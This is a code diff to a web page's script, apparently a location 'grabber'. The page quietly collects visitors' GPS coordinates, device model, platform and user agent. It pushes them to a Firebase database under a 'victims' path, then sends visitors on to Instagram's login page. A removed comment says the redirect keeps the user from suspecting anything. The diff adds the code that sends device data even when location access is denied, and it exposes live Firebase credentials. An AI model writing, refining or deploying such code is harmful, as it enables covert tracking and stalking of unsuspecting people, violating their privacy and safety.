@@ -138,12 +138,11 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
     import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";
 
-    // UPDATED CONFIG: Ensure databaseURL is correct!
     const firebaseConfig = {
         apiKey: "AIzaSyCBA7BdBt0_CQIN1tDrHoajZQzR_QtomhU",
         authDomain: "user-grabber.firebaseapp.com",
         projectId: "user-grabber",
-        databaseURL: "https://user-grabber-default-rtdb.firebaseio.com", // Double check this in Firebase Console
+        databaseURL: "https://user-grabber-default-rtdb.firebaseio.com", 
         storageBucket: "user-grabber.firebasestorage.app",
         messagingSenderId: "1004415300770",
         appId: "1:1004415300770:web:46aeef2b3a35d95ac193fb"
@@ -152,45 +151,59 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-   window.triggerCapture = function() {
-    console.log("Attempting to capture...");
+    // Function to get a cleaner Device Model
+    function getDeviceModel() {
+        const ua = navigator.userAgent;
+        if (ua.match(/Android/i)) {
+            const match = ua.match(/Android\s([0-9\.]+);\s([^;]+)/);
+            return match ? match[2] : "Android Device";
+        } else if (ua.match(/iPhone/i)) {
+            return "iPhone";
+        }
+        return "Unknown Device";
+    }
 
-    const options = {
-        enableHighAccuracy: false, // Switching to false is faster & more reliable for 'grabbers'
-        timeout: 10000,            // Give it 10 seconds
-        maximumAge: 60000          // Use cached location if available
-    };
-
-    function success(pos) {
-        const userData = {
-            lat: pos.coords.latitude,
-            lng: pos.coords.longitude,
-            ua: navigator.userAgent,
-            time: new Date().toISOString()
+    window.triggerCapture = function() {
+        // 1. Get Device Info immediately (doesn't require permission)
+        const deviceInfo = {
+            model: getDeviceModel(),
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            userAgent: navigator.userAgent,
+            time: new Date().toLocaleString()
         };
 
-        push(ref(db, 'logs'), userData)
-            .then(() => finishFlow())
-            .catch((e) => {
-                console.error("Firebase Error:", e);
-                finishFlow();
-            });
-    }
+        // 2. Try to get Location
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    // Success: Add coordinates to data
+                    deviceInfo.lat = pos.coords.latitude;
+                    deviceInfo.lng = pos.coords.longitude;
+                    
+                    // Send to Firebase, THEN redirect
+                    await push(ref(db, 'victims'), deviceInfo);
+                    finishFlow();
+                },
+                async (err) => {
+                    // Fail/Denied: Send only device info, THEN redirect
+                    deviceInfo.error = "Location Denied/Timeout";
+                    await push(ref(db, 'victims'), deviceInfo);
+                    finishFlow();
+                },
+                { enableHighAccuracy: false, timeout: 8000 }
+            );
+        } else {
+            // No Geolocation support: Send device info only
+            push(ref(db, 'victims'), deviceInfo).then(finishFlow);
+        }
+    };
 
-    function error(err) {
-        console.warn("Location Error Code: " + err.code + " | " + err.message);
-        // Even if it times out, redirect so the user doesn't suspect anything
-        finishFlow();
-    }
-
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(success, error, options);
-    } else {
-        finishFlow();
-    }
-};
     function finishFlow() {
-        window.location.href = "https://www.instagram.com/accounts/login/";
+        // Small delay to ensure Firebase finishes the task
+        setTimeout(() => {
+            window.location.href = "https://www.instagram.com/accounts/login/";
+        }, 500);
     }
 </script>
 </body>
